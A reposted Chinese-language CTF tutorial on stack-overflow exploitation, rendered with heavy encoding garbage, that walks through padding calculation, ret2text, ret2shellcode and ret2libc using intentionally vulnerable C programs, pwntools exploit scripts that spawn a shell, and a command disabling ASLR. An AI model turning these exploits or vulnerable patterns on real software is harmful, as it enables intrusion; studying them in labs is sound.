> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7W9VSSeSXhzl-8lobEzdIg)

è½¬è‡ªï¼šé›·çŸ³å®‰å…¨å®éªŒå®¤

Â PWN-æ ˆæº¢å‡ºå…¥é—¨Â 

  

æº¢å‡ºpaddingè®¡ç®—

**æ–¹æ³•1ï¼šesp/ebpè·ç¦»è®¡ç®—**

1.Â æº¢å‡ºå‡½æ•°å¤„ä¸‹æ–­ç‚¹

b main

2.Â è®°å½•espã€ebp

EBP: 0xbffff508 --> 0x0

ESP: 0xbffff480 --> 0x0

3.Â æ‰¾åˆ°æº¢å‡ºå‡½æ•°å‚æ•°ä½ç½®

0x804858c <main+95>: lea Â Â Â eax,[esp+0x1c]

4.Â padding = (ebp - (esp+1c)) + 4 = (0xbffff508 - 0xbffff480 - 0x1c ) +4 = 112

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnGgnZtf5evE5x6Brj9KpZoKMqxEB9zOrUtYVIl53Jb4rbe5qD9ff5tQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7gtTg0Pz11PFtdmkUDsdDs5GDqRvB5JWX4Bhf5Z2uEPRswjKGAMB9A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**æ–¹æ³•2ï¼špattern_create**

  

é€šå¸¸æƒ…å†µä¸‹ebp + 4/rbp + 8æ›´å‡†ç¡®

pattern_offset $ebp

pattern_offset $eip

pattern_offset $rbp

pattern_offset $rip

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7tGiboFy5UXFvmV0Gpf0E26oKT5E9WY0mD4X0Zlm3o9LFaKTViazPkvQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**æ–¹æ³•3ï¼šcyclic**

  

  

```
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/CTF]  
â””â”€#Â cyclicÂ 200Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 148Â â¨¯Â 1Â âš™  
[!]Â PwntoolsÂ doesÂ notÂ supportÂ 32-bitÂ Python.Â Â UseÂ aÂ 64-bitÂ release.  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â   
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/CTF]  
â””â”€#Â gdbÂ ret2shellcodeÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 1Â âš™  
gdb-peda$Â run  
StartingÂ program:Â /home/kali/Desktop/CTF/ret2shellcodeÂ   
NoÂ systemÂ forÂ youÂ thisÂ timeÂ !!!  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab  
byeÂ byeÂ ~  
ProgramÂ receivedÂ signalÂ SIGSEGV,Â SegmentationÂ fault.  
[----------------------------------registers-----------------------------------]  
EAX:Â 0x0Â   
EBX:Â 0x0Â   
ECX:Â 0x9Â ('\t')  
EDX:Â 0xffffffffÂ   
ESI:Â 0xb7fb0000Â -->Â 0x1e4d6cÂ   
EDI:Â 0xb7fb0000Â -->Â 0x1e4d6cÂ   
EBP:Â 0x62616163Â ('caab')  
ESP:Â 0xbffff510Â ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")  
EIP:Â 0x62616164Â ('daab')  
EFLAGS:Â 0x10282Â (carryÂ parityÂ adjustÂ zeroÂ SIGNÂ trapÂ INTERRUPTÂ directionÂ overflow)  
[-------------------------------------code-------------------------------------]  
InvalidÂ $PCÂ address:Â 0x62616164  
  
Legend:Â code,Â data,Â rodata,Â value  
StoppedÂ reason:Â SIGSEGV  
0x62616164Â inÂ ??Â ()  
gdb-peda$Â   
zsh:Â suspendedÂ Â gdbÂ ret2shellcode  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â   
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/CTF]  
â””â”€#Â cyclicÂ -lÂ "0x62616164"Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 148Â â¨¯Â 2Â âš™  
[!]Â PwntoolsÂ doesÂ notÂ supportÂ 32-bitÂ Python.Â Â UseÂ aÂ 64-bitÂ release.  
112 
```

  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**æ ˆæº¢å‡ºåˆ©ç”¨**

**ret2text**

ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç (.text)

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

ç¤ºä¾‹

  

  

```
//Â gccÂ -m32Â -fno-stack-protectorÂ -no-pieÂ ret2text.cÂ -oÂ ret2text  
  
#includeÂ <stdio.h>  
  
#includeÂ <string.h>  
  
  
  
voidÂ success()Â {  
  
Â Â Â Â puts("SUCCESS!!!");  
  
Â Â Â Â system("catÂ flag");  
  
}  
  
  
  
voidÂ vulnerable()Â {  
  
Â Â charÂ s[12];  
  
Â Â gets(s);  
  
Â Â puts(s);  
  
Â Â return;  
  
}  
  
  
  
intÂ main(intÂ argc,Â charÂ **argv)Â {  
  
Â Â vulnerable();  
  
Â Â returnÂ 0;  
  
}  

```

  

.textæ®µå­˜åœ¨flagå…³é”®ä¿¡æ¯å‡½æ•°

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

è®¡ç®—æº¢å‡ºé•¿åº¦

xxxxx

pythonä»£ç 

from pwn import *

  

sh = process("./ret2text")

win = 0x8049182

sh.sendline(b'A'*24 + p32(win))

sh.interactive()

  

**ret2shellcode**

å›¾1

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

å›¾2

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

é—®é¢˜ï¼šå¦‚ä½•ç¡®å®šshellcodeèµ·å§‹åœ°å€

å…³é—­ASLR

ASLR(ç³»ç»Ÿå¼€å¯çš„)

  

ASLRæ˜¯ä¸€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œé€šè¿‡å¯¹å †ã€æ ˆã€å…±äº«åº“æ˜ å°„ç­‰çº¿æ€§åŒºå¸ƒå±€çš„éšæœºåŒ–ï¼Œé€šè¿‡å¢åŠ æ”»å‡»è€…é¢„æµ‹ç›®çš„åœ°å€çš„éš¾åº¦ï¼Œé˜²æ­¢æ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®ï¼Œè¾¾åˆ°é˜»æ­¢æº¢å‡ºæ”»å‡»çš„ç›®çš„ã€‚

  

åœ¨linuxä¸­ä½¿ç”¨æ­¤æŠ€æœ¯åï¼Œæ€æ­»æŸç¨‹åºåé‡æ–°å¼€å¯ï¼Œåœ°å€æ¢ã€‚

  

åœ¨windowsä¸­ä½¿ç”¨æ­¤æŠ€æœ¯åï¼Œæ€æ­»è¿›ç¨‹åé‡æ–°å¼€å¯ï¼Œåœ°å€ä¸æ¢ï¼Œé‡å¯æ‰ä¼šæ”¹å˜ã€‚

  

  

  

ä»¥ä¸Šcatå‘½ä»¤è¾“å‡ºçš„å€¼è¡¨ç¤ºï¼š

  

0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚

1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚

2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚

  

echo 0 > /proc/sys/kernel/randomize_va_space

echo 1 > /proc/sys/kernel/core_uses_pid

ç¤ºä¾‹

#include <unistd.h>

void vuln_func()

{

Â Â Â Â Â Â Â Â char buf[128];

Â Â Â Â Â Â Â Â read(STDIN_FILENO,buf,256);

}

  

int main(void)

{

Â Â Â Â Â Â Â Â vuln_func();

Â Â Â Â Â Â Â Â write(STDOUT_FILENO,"hello world!\n",13);

}

  

1.Â æ‰§è¡Œæº¢å‡ºç¡®å®šæº¢å‡ºåœ°å€å’Œcoreæ–‡ä»¶

ä¸ºä»€ä¹ˆæ˜¯$esp-140-4Â å› ä¸ºæ­¤æ—¶çš„espæŒ‡å‘å‡½æ•°è¿”å›åœ°å€

å‡½æ•°æ˜¯æ‰§è¡Œretä¹‹åæ‰æŠ¥é”™çš„ï¼Œæ‰€ä»¥æ­¤æ—¶ä»£ç å·²ç»æ‰§è¡Œå®Œæˆretï¼Œä¹Ÿå°±æ˜¯è¯´espæŒ‡å‘ï¼ˆè¿”å›åœ°å€ + 4ï¼‰

```
  
â””â”€# gdb stack3 core.2936 -q                                                                                                                                                                                                             1 âš™  
  
Reading symbols from stack3...  
  
(No debugging symbols found in stack3)  
  
[New LWP 2936]  
  
Core was generated by `./stack3'.  
  
Program terminated with signal SIGSEGV, Segmentation fault.  
  
#0  0xbf91afc0 in ?? ()  
  
gdb-peda$ x/4wx $esp-140-4  
  
0xbffff4c0:     0x2f68686a      0x68732f2f      0x6e69622f      0x0168e389  
  
gdb-peda$  
  
zsh: suspended  gdb stack3 core.2936 -q  
  
  
  
#!/usr/bin/env python  
  
from pwn import *  
  
  
  
sh = process('./stack3')  
  
  
  
# æ–¹æ³•1  
  
shellcode = asm(shellcraft.sh())  
  
buf2_addr = 0xbffff4c0  
  
print(shellcode)  
  
pause()  
  
sh.sendline(shellcode + b'B'*(140-len(shellcode)) + p32(buf2_addr) )  
  
sh.interactive()â”Œâ”€â”€(rootï¿½kali)-[/home/kali/Desktop/CTF]  
  
â””â”€# gdb stack3 core.2936 -q                                                                                                                                                                                                             1 âš™  
  
Reading symbols from stack3...  
  
(No debugging symbols found in stack3)  
  
[New LWP 2936]  
  
Core was generated by `./stack3'.  
  
Program terminated with signal SIGSEGV, Segmentation fault.  
  
#0  0xbf91afc0 in ?? ()  
  
gdb-peda$ x/4wx $esp-140-4  
  
0xbffff4c0:     0x2f68686a      0x68732f2f      0x6e69622f      0x0168e389  
  
gdb-peda$  
  
zsh: suspended  gdb stack3 core.2936 -q  
  
  
  
#!/usr/bin/env python  
  
from pwn import *  
  
  
  
sh = process('./stack3')  
  
  
  
# æ–¹æ³•1  
  
shellcode = asm(shellcraft.sh())  
  
buf2_addr = 0xbffff4c0  
  
print(shellcode)  
  
pause()  
  
sh.sendline(shellcode + b'B'*(140-len(shellcode)) + p32(buf2_addr) )  
  
sh.interactive()  
// gcc -m32 -fno-stack-protector -no-pie ret2text.c -o ret2text  
  
#include <stdio.h>  
  
#include <string.h>  
  
  
  
void success() {  
  
    puts("SUCCESS!!!");  
  
    system("cat flag");  
  
}  
  
  
  
void vulnerable() {  
  
  char s[12];  
  
  gets(s);  
  
  puts(s);  
  
  return;  
  
}  
  
  
  
int main(int argc, char **argv) {  
  
  vulnerable();  
  
  return 0;  
  
}  

```

  

æ–¹æ³•2ï¼š

```
  
â””â”€# gdb stack3 core.2961 -q                                                                                                                                                                                                             6 âš™  
  
Reading symbols from stack3...  
  
(No debugging symbols found in stack3)  
  
[New LWP 2961]  
  
Core was generated by `./stack3'.  
  
Program terminated with signal SIGSEGV, Segmentation fault.  
  
#0  0xbf91afc0 in ?? ()  
  
gdb-peda$ x/4wx $esp  
  
0xbffff550:     0xbffff50a      0x00000000      0x00000000      0xb7de9e46  
  
gdb-peda$  
  
  
  
  
  
  
  
#!/usr/bin/env python  
  
from pwn import *  
  
  
  
sh = process('./stack3')  
  
# æ–¹æ³•2  
  
buf2_addr = 0xbffff550 # å°±æ˜¯espçš„å€¼  
  
print(shellcode)  
  
pause()  
  
sh.sendline(b'b'*140+ p32(buf2_addr)  + shellcode)  
  
sh.interactive()  
  
  
  
  
  
â”Œâ”€â”€(rootï¿½kali)-[/home/kali/Desktop/CTF]  
  
â””â”€# python3 stack3.py                                                                                                                                                                                                                   3 âš™  
  
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.  
  
[+] Starting local process './stack3': pid 3037  
  
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'  
  
[*] Switching to interactive mode  
  
$ id  
  
uid=0(root) gid=0(root) groups=0(root),143(kaboxer)  
  
$  
  
[*] Interrupted  
  
[*] Stopped process './stack3' (pid 3037)  
  
  

```

  

**ret2libc**

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

ä¾‹1

IDAåˆ†æ

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

sh_addr = 0x08048720

  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

system_addr = 0x08048460

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

padding = 112

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

exp

from pwn import *

  

sh = process("./ret2libc1")

  

binsh = 0x08048720

  

system_plt = 0x08048460

  

whatever_addr = 0x11111111

  

payload = b"a" * 112

payload += p32(system_plt)

payload += p32(whatever_addr)# è¿™é‡Œå°±æ˜¯è°ƒç”¨systemçš„è¿”å›åœ°å€ï¼Œæ²¡æœ‰å®é™…æ„ä¹‰

payload += p32(binsh)

  

sh.sendline(payload)

  

sh.interactive()

  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

ä¾‹2

checksec

xxxxx

  

è®¡ç®—padding = 112

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

.bss buf2 = 0x0804A080

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

gets = 08048460

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

system = 08048490

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

æ ˆæƒ…å†µåˆ†æ

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

exp

from pwn import *

  

sh = process("./ret2libc2")

  

get_addr = 0x08048460

buf_addr = 0x0804A080

system_addr = 0x08048490

  

payload = b"Q" * 112

payload += p32(get_addr)

payload += p32(system_addr)

payload += p32(buf_addr)

payload += p32(buf_addr)

  

sh.sendline(payload)

sh.sendline("/bin/sh")

  

sh.interactive()

  

exp2

from pwn import *

  

sh = process("./ret2libc2")

elf = ELF("./ret2libc2")

  

get_addr = elf.plt['gets']

system_addr = elf.plt['system']

buf_addr = elf.symbols['buf2']

  

payload = b"Q" * 112

payload += p32(get_addr)

payload += p32(system_addr)

payload += p32(buf_addr)

payload += p32(buf_addr)

  

sh.sendline(payload)

sh.sendline("/bin/sh")

  

sh.interactive()

  

  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

ä¾‹3

å‡½æ•°åŸºå€ base = Aå‡½æ•°got - Aå‡½æ•°libc = Bå‡½æ•°got - Bå‡½æ•°libc

  

xctf level3

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

libc_write = 0x000D43C0

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

libc_system = 0x0003A940

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

libc_bin = 0x0015902B

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**æ¨èâ†“â†“â†“**

 ![](http://mmbiz.qpic.cn/mmbiz_png/2tA4hG6O9pyRtgZD1QZjuZKGousFdK6w43nmK1fPKzTrwgJ1ZzVDkJrz2zQ5bDxJ2icbJN5R70PUXx3IKibzwNtQ/0?wx_fmt=png) ** æ©˜çŒ«å­¦å®‰å…¨ ** æ¯æ—¥ä¸€å¹²è´§ğŸ™‚ 0ç¯‡åŸåˆ›å†…å®¹   å…¬ä¼—å·